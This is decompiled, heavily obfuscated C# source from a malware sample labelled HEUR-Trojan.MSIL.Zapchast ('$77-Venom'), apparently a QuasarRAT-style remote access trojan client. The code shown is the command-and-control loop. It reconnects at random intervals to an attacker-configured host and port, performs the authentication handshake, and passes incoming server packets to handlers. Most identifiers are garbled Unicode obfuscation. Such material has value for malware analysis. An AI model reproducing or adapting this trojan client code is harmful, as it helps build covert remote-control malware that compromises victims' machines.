// Decompiled with JetBrains decompiler
// Type: ࣹ㾧࢙�뽶蘵溚꽿樍ㄼው랧鴲ꗮ䶻䷹鼙
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.NetSerializer;
using xClient.Core.Packets.ServerPackets;

public class \uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙 : 
  鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨
{
  private readonly \u2B08㫟ఞ쵃벂\u27E5杖Ⴚ敺\u330D掎冺ณ鎄\u2E4Cಾ杂ⶐ晲観 甲륾铝省ບ髷斆傱銸旿匜퇟ꕵ䀨\u171Bꪅﵒꦮᖭ癪;

  public static bool Exiting { get; private set; }

  public bool Authenticated { get; private set; }

  public \uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙(
    \u2B08㫟ఞ쵃벂\u27E5杖Ⴚ敺\u330D掎冺ณ鎄\u2E4Cಾ杂ⶐ晲観 hostsManager)
  {
    this.甲륾铝省ບ髷斆傱銸旿匜퇟ꕵ䀨\u171Bꪅﵒꦮᖭ癪 = hostsManager;
    this.Serializer = new Serializer((IEnumerable<System.Type>) 㦕暊\u3342嫠ˑՈℜઑ런쭜蚳\uE284\uFFFD༣춻遲ꢖ\u06E9\uF8B0杁.䢉殞䕡\u3210똣矤셗\uFFFD沅蚭\uE8B1압\uA959뛐ұ\u0865\uF7DB닉쇪馼());
    this.棺\uED18\uEE92뇓湱퓙\u2FFC舎䨳\u21A5탑퇯\uED2F쏧蹥陛\uEB9A\u331D颇ꠕ += new 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.\uE85Cꭜ\u2587漌鮔뜛ఖ\u296B棔偸浞鬢뵒\u24FE갨ᷘ맔\uE359㣈諸(this.\uEAE1卥鯗䩒㣥办Ẅ\uF1BA\uAAC7㝬罡Ч\uF02Aﯻ\u104D꿹嬉ꉎ솿珽);
    this.瀹鍅옩荲稝ֺꜩ됀폋헄ᓑ먥摀ﰙ旗\uFFFD\uF1D0炡萰\uF153 += new 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.䓼섳\uFFFD弆嬨럛嫬蝸\uF0AA᪴苠쒁楘Ὥ닒弛끴澕竀젟(this.ꆭ\u2B46帼孞쎩蘏\u038B䆛濌搉έꞬꙘ堗괟纪മ좠펺\uE344);
    this.凇溂삃讓\uFDDE㦊棦鐊頙㽺홃瘁볰ᅮꀙ邈匛Ἲ̐댇 += new 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.ㅱ蛍澹\uF24DⳆᜌ楛緛ᄖ绯\u208C\u2974絈\u25E4얛෭㐖\u2027哚\uE1D5(this.ᄞ㬊㦴\uED74ḇ䨃\uFFFD\u24F3ᎌ᪇巩\uEE63ꎿ籼ㆋ䇱텑ﮊ蠇㒾);
  }

  public void \uE021낋\u2832반㮍㦠돤ቝ\uE513懍\uE7D5\u3304褓伤썺쎅\uFFFD灹研㞮()
  {
    while (!\uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙.Exiting)
    {
      if (!this.Connected)
      {
        Thread.Sleep(100 + new Random().Next(0, 250));
        ࢧ얺ｋ\u326B捲\u0AFE\uE86B\uF59A\uE762䀉狯\u0F3B蟢覧\uAAD1\uFFFD畨ꃫ颪\uFFFD ࢧ얺ｋ捲䀉狯蟢覧畨ꃫ颪 = this.甲륾铝省ບ髷斆傱銸旿匜퇟ꕵ䀨\u171Bꪅﵒꦮᖭ癪.\uECD5肳钪䙗\uE223ꂭ\uE840뼺ₔ瀷ᬘ响꾛\u3003鷍熢출\uFFFD홋룞();
        this.㿿軿\uE552蹫\uF4EC\u24B3浍ᤌ澩鄍ĉ췯\uE07Dฒ뢱즢\uECA9쪘㫹\uEA4E(ࢧ얺ｋ捲䀉狯蟢覧畨ꃫ颪.IpAddress, ࢧ얺ｋ捲䀉狯蟢覧畨ꃫ颪.Port);
        Thread.Sleep(200);
        Application.DoEvents();
      }
      while (this.Connected)
      {
        Application.DoEvents();
        Thread.Sleep(2500);
      }
      if (\uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙.Exiting)
      {
        this.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
        break;
      }
      Thread.Sleep(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.䶓鱡Ὴࡇ಼\u31D6ﻖ嵎\uE4BB탶텾Ⴘ裚ˊ퓞\uFFFD\uF8C1酮\u327E\uFFFD + new Random().Next(250, 750));
    }
  }

  private void ꆭ\u2B46帼孞쎩蘏\u038B䆛濌搉έꞬꙘ堗괟纪മ좠펺\uE344(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client,
    灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5 packet)
  {
    System.Type type = packet.GetType();
    if (!this.Authenticated)
    {
      if (type == typeof (GetAuthentication))
      {
        匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.ᔫ饛椱莙乷䟀急嗓獉\uFFFD䴬㸿劽菆嗚㵍铡娈鶋䅰((GetAuthentication) packet, client);
      }
      else
      {
        if (!(type == typeof (SetAuthenticationSuccess)))
          return;
        this.Authenticated = true;
      }
    }
    else
      \u1814ꭃ뙷\uEBEF짵\uF7A3Ꙛﱵﱃ죾黮\uF7F0淃ᡥ鲈帇䏡핺ۺ盡.門\uFFFD쪞䑄沤骣ꩾퟩ\u3226輑\u2755洰韤䀑撹\uF284࠙䛊컩\uE247(client, packet);
  }

  private void ᄞ㬊㦴\uED74ḇ䨃\uFFFD\u24F3ᎌ᪇巩\uEE63ꎿ籼ㆋ䇱텑ﮊ蠇㒾(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client,
    Exception ex)
  {
    client.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
  }

  private void \uEAE1卥鯗䩒㣥办Ẅ\uF1BA\uAAC7㝬罡Ч\uF02Aﯻ\u104D꿹嬉ꉎ솿珽(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client,
    bool connected)
  {
    this.Authenticated = false;
    if (connected || \uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙.Exiting)
      return;
    this.閭\u1B7D䁠ꉆ庣曨勪䫕傉\uE873夰\uE006\u2765\uE5B4\uFFFD䗴鬅\uEC76\u256F驻();
  }

  private void 閭\u1B7D䁠ꉆ庣曨勪䫕傉\uE873夰\uE006\u2765\uE5B4\uFFFD䗴鬅\uEC76\u256F驻() => 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.챊\u262C䞻젭ᾐ䧵ꍞ뢭\uF2AD鲋쫞麥\u25E3쒱저脌틼\uF627\u333D埔();

  public void \u31E7녿Ⅻ묋钮卵\u268F橢齄퍐紼죋\uF554ᴉ\u2873\uE17E衾眫螱ᑭ()
  {
    \uF67Dࣹ㾧\uF60C\u0899\uFFFD뽶蘵溚꽿樍\uF71Cㄼው랧鴲ꗮ\u4DBB\u4DF9鼙.Exiting = true;
    this.铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀();
  }
}
